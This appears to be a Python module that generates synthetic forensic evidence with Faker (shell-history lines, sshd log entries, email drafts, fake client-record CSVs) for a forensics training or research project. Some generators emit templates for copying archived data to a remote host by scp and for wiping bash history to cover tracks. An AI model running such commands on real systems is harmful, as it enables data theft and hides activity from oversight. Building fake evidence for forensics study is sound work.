"""Synthetic evidence content generators, backed by Faker.

Every value here is fabricated. Faker never touches real personal data -
that's precisely why this project's forensic track doesn't need ethics
approval (see the research tracker's justification for Faker). Nothing
in this module should ever accept or embed a real name, email, IP, or
record: if a demo scenario needs to "feel real," make it more elaborate
with Faker, never substitute anything genuine.
"""

from datetime import datetime

from faker import Faker

fake = Faker()


def shell_command_exfiltration(filename: str | None = None, host: str | None = None) -> str:
    """A single shell-history line: archiving and copying data off-box."""
    filename = filename or f"{fake.word()}_client_export.tar.gz"
    host = host or fake.hostname()
    return f"scp {filename} {fake.user_name()}@{host}:/data/backup/"


def shell_command_archive(directory: str | None = None) -> str:
    """A single shell-history line: bundling a directory before exfiltration."""
    directory = directory or f"/home/{fake.user_name()}/Documents/clients"
    return f"tar -czf {fake.word()}_archive.tar.gz {directory}"


def shell_command_history_clear() -> str:
    """A single shell-history line: an attempt to cover tracks."""
    return "history -c && rm -f ~/.bash_history"


def auth_log_entry(event: str, when: datetime, user: str | None = None, source_ip: str | None = None) -> str:
    """A syslog-style line for an auth-relevant event (e.g. USB mount, large transfer)."""
    user = user or fake.user_name()
    source_ip = source_ip or fake.ipv4_private()
    timestamp = when.strftime("%b %d %H:%M:%S")
    hostname = fake.hostname().split(".")[0]
    return f"{timestamp} {hostname} sshd[{fake.random_int(1000, 9999)}]: {event} for user {user} from {source_ip}"


def email_draft(subject: str, body: str, sender: str | None = None, recipient: str | None = None) -> str:
    """A plain-text email draft (.eml-lite): headers plus body, fully synthetic."""
    sender = sender or fake.email()
    recipient = recipient or fake.email()
    return (
        f"From: {sender}\n"
        f"To: {recipient}\n"
        f"Subject: {subject}\n"
        f"Date: {fake.date_time_this_month().strftime('%a, %d %b %Y %H:%M:%S')}\n"
        "\n"
        f"{body}\n"
    )


def fake_client_records_csv(rows: int = 25) -> str:
    """A CSV of synthetic 'client records' - the shape of exfiltrated data
    without any real information at all, for deleted-file scenarios."""
    lines = ["id,name,email,phone,account_ref"]
    for i in range(1, rows + 1):
        lines.append(
            f"{i},{fake.name()},{fake.email()},{fake.phone_number()},{fake.bothify('ACC-#####')}"
        )
    return "\n".join(lines) + "\n"
